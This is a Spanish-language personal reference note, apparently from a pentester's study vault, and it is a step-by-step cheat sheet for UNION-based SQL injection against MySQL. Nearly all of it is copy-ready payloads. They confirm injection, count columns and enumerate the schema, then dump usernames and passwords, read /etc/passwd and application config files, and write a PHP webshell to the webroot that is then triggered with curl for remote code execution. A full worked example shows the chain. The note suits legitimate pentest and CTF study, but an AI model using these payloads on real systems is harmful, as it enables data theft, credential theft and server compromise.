---
tipo: meta
aliases:
  - Payloads UNION
  - UNION paso a paso
tags:
  - meta/referencia
  - dominio/web
---

# SQLi UNION - matriz de referencia

> [!info] Referencia pura, no un zettel
> Se consulta, no se lee. La decisión —cuándo elegir este canal y cuándo no— vive en [[SQLi - canal UNION]]. Acá está el procedimiento completo, en orden de ejecución.
>
> Cada payload va en su propia línea entre backticks: parado encima, `yi``  ` lo copia al portapapeles. Ejemplos en MySQL; el cierre, el comentario y las funciones cambian por motor — ver [[Dialectos SQL - matriz de referencia]].

## 0. Confirmar que hay inyección

`'`
Error de sintaxis o comportamiento anómalo. Primera prueba, siempre.

`''`
La página vuelve a la normalidad. Confirma que la comilla se interpreta y no se escapa.

`' AND '1'='1`  vs  `' AND '1'='2`
Verdadero muestra datos, falso no. Confirma inyección en contexto de cadena.

`1 AND 1=1`  vs  `1 AND 1=2`
Lo mismo sin comillas. Confirma inyección en contexto numérico.

## 1. Descubrir el cierre

Sin esto nada de lo que sigue funciona: la variable puede estar entre comillas, entre paréntesis, o ambas. Se prueba cada cierre agregando `-- -` al final; el primero que deja de dar error es el correcto.

| Cierre | Consulta original probable |
|---|---|
| `'` | `WHERE nombre = 'ENTRADA'` |
| `"` | `WHERE nombre = "ENTRADA"` |
| `)` | `WHERE id = (ENTRADA)` |
| `')` | `WHERE nombre = ('ENTRADA')` |
| `"))` | `WHERE (nombre = ("ENTRADA"))` |
| (nada) | `WHERE id = ENTRADA` — numérico |

## 2. Comentarios de cierre

| Comentario | Motor | Nota |
|---|---|---|
| `-- -` | MySQL, MSSQL, PgSQL, Oracle | El guion final fuerza el espacio que MySQL exige tras `--` |
| `#` | MySQL | En URL va codificado como `%23` |
| `/**/` | Todos | Sirve además para reemplazar espacios filtrados |

## 3. Contar columnas

`' ORDER BY 1-- -`  (incrementar hasta el error)
Cantidad exacta de columnas: el último valor sin error. Primer paso obligatorio.

`' UNION SELECT NULL,NULL,NULL-- -`
Confirma la cantidad; `NULL` es compatible con cualquier tipo.

`ORDER BY` de más falla con *Unknown column 'N' in 'order clause'*. `UNION` con cantidad equivocada, con *different number of columns*.

## 4. Encontrar la columna que se imprime

`' UNION SELECT 1,2,3-- -`
Los números que aparecen en pantalla marcan las columnas útiles. Más rápido que iterar con `'a'`.

`' UNION SELECT 'a',NULL,NULL-- -`  (iterar la posición)
Qué columna refleja cadenas, cuando el motor exige tipos y los números no salen.

`' AND 1=2 UNION SELECT 1,2,3-- -`
Suprime las filas originales; solo quedan las tuyas. **Cuando la página muestra solo la primera fila** — el olvido #1 de por qué un UNION correcto "no muestra nada".

## 5. Reconocimiento

`' UNION SELECT @@version,user(),database()-- -`
Versión del motor, usuario actual y base activa. Recon inicial.

`' UNION SELECT @@hostname,@@datadir,NULL-- -`
Nombre del host y ruta de datos. Ubicar el servidor en la red.

## 6. Enumerar el catálogo

`' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -`
Todas las bases de datos.

`' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='dev'-- -`
Tablas de la base `dev`.

`' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -`
Columnas de la tabla `users`.

`' UNION SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%pass%'-- -`
Dónde está lo interesante sin recorrer todo. Atajo cuando hay muchas tablas.

## 7. Extraer

`' UNION SELECT username,password FROM users-- -`
Dos columnas separadas. El caso normal.

`' UNION SELECT group_concat(username,0x3a,password),NULL FROM users-- -`
Todo en una fila, separado por `:`. Cuando el frontend refleja una sola fila. `0x3a` es `:` en hex — evita escribir comillas si están filtradas.

`' UNION SELECT CONCAT(username,0x3a,password),NULL FROM users-- -`
Una fila por usuario. Cuando `group_concat` trunca por longitud.

`' UNION SELECT username,password FROM users LIMIT 1 OFFSET 3-- -`
La cuarta fila. Iterar de a una cuando solo se ve una.

`' UNION SELECT username,password FROM otra_base.users-- -`
Datos de otra base del mismo servidor. Movimiento lateral dentro del motor.

## 8. Privilegios — antes de intentar RCE

`' UNION SELECT super_priv,NULL FROM mysql.user WHERE user='root'-- -`
Si `root` es Super Admin. Chequeo previo a RCE.

`' UNION SELECT variable_value,NULL FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -`
Ruta permitida para leer y escribir. Vacío = cualquier ruta; con valor = solo esa; `NULL` = E/S deshabilitada.

Lista de privilegios de un usuario (payload con comillas dobles, va en bloque):

```sql
' UNION SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

## 9. Lectura y escritura de archivos

`' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -`
Lectura arbitraria. Requiere `secure_file_priv` permisivo y privilegio `FILE`.

`' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL-- -`
Credenciales de la app en claro. Suele dar más que la propia base.

`' UNION SELECT 'file written',NULL INTO OUTFILE '/var/www/html/proof.txt'-- -`
Prueba de escritura. Verificar antes de intentar la webshell.

Webshell PHP en el webroot → RCE (payload con backticks, va en bloque):

```php
' UNION SELECT '<?=`$_GET[0]`?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -
```

Después: `curl 'http://objetivo/shell.php?0=id'`.

## Ejemplo completo

Objetivo ficticio, parámetro reflejado, MySQL. Los pasos 4 en adelante llevan `AND 1=2` porque la app imprime una sola fila.

```
1. ?id=1'                                    → error de sintaxis: hay inyección
2. ?id=1''                                   → normal: la comilla no está escapada
3. ?id=1' ORDER BY 3-- -                     → normal
   ?id=1' ORDER BY 4-- -                     → Unknown column '4'  → son 3 columnas

4. ?id=1' AND 1=2 UNION SELECT 1,2,3-- -     → imprime "2" y "3" → útiles la 2 y la 3

5. ?id=1' AND 1=2 UNION SELECT NULL,@@version,database()-- -

6. ?id=1' AND 1=2 UNION SELECT NULL,table_name,NULL
      FROM information_schema.tables 
      WHERE table_schema='appdb'-- -

7. ?id=1' AND 1=2 UNION SELECT NULL,column_name,NULL
      FROM information_schema.columns 
      WHERE table_schema='appdb' and table_name='users'-- -

8. ?id=1' AND 1=2 UNION SELECT NULL,username,password FROM users-- -

9. ?id=1' AND 1=2 UNION SELECT NULL,variable_value,NULL
      FROM information_schema.global_variables
      WHERE variable_name='secure_file_priv'-- -
```

## Errores frecuentes y qué significan

| Mensaje | Qué pasó |
|---|---|
| `Unknown column 'N' in 'order clause'` | Te pasaste contando: son `N-1` columnas |
| `different number of columns` | El `UNION` no coincide en cantidad |
| `Illegal mix of collations` | Choque de codificaciones — envolver en `CONVERT(col USING utf8)` |
| Página normal, sin datos tuyos | Faltó `AND 1=2`, o la columna elegida no se imprime |
| `--secure-file-priv option` | E/S de archivos restringida o deshabilitada |

## Relacionadas

[[SQLi - canal UNION]] · [[MOC - SQL injection]] · [[Dialectos SQL - matriz de referencia]]
